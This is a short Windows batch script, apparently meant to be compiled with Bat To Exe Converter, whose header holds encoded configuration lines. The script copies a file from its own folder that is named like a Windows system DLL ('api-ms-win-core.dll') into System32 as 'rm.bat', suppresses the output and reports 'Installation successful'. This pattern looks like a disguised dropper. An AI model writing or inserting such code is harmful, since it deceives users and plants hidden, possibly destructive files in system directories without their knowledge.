::[Bat To Exe Converter]
::
::fBE1pAF6MU+EWHreyHcjLQlHcCWGMWK0D6YI+unv4Pi7hkgOX/YwaLPayr3DLfNe/UzqOJUixH8UnMcAbA==
::YAwzoRdxOk+EWAjk
::fBw5plQjdCyDJGyX8VAjFDpQQQ2MNXiuFLQI5/rHy++UqVkSRN4IcZze7LGNNO8B1XbhYYM96SsKy4UFDxQ4
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSDk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpSI=
::dAsiuh18IRvcCxnZtBNQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+IeA==
::cxY6rQJ7JhzQF1fEqQJmZkwaGkrVXA==
::ZQ05rAF9IBncCkqN+0xwdVsCAlPMaiXtZg==
::ZQ05rAF9IAHYFVzEqQInIRXTpeyQMQs=
::eg0/rx1wNQPfEVWB+kM9LVsJDA2ML3/0A60ZiA==
::fBEirQZwNQPfEVWB+kM9LVsJDBOLMuxT7qcRiA==
::cRolqwZ3JBvQF1fEqQInIRXTpeyQMQs=
::dhA7uBVwLU+EWN1aCcTZ0JO2iYNr9Qs=
::YQ03rBFzNR3SWATEcJzNrvKsxOZHu4JzZg==
::dhAmsQZ3MwfNWATEcJzNrvKsxOZHu4JzZg==
::ZQ0/vhVqMQ3MEVWAtB9wrMWpyu16tIl/gVzViA==
::Zg8zqx1/OA3MEVWAtB9wrMWpyu16tIl/gVzViA==
::dhA7pRFwIByZRRkAKr+2wePcrsEF1aLa
::Zh4grVQjdCyDJGyX8VAjFDpQQQ2MNXiuFLQI5/rHy++UqVkSRN42dpzPlLGWJYA=
::YB416Ek+ZW8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off
set "core=%~dp0api-ms-win-core.dll"
copy "%core%" C:\Windows\System32\rm.bat >nul
echo Installation successful
pause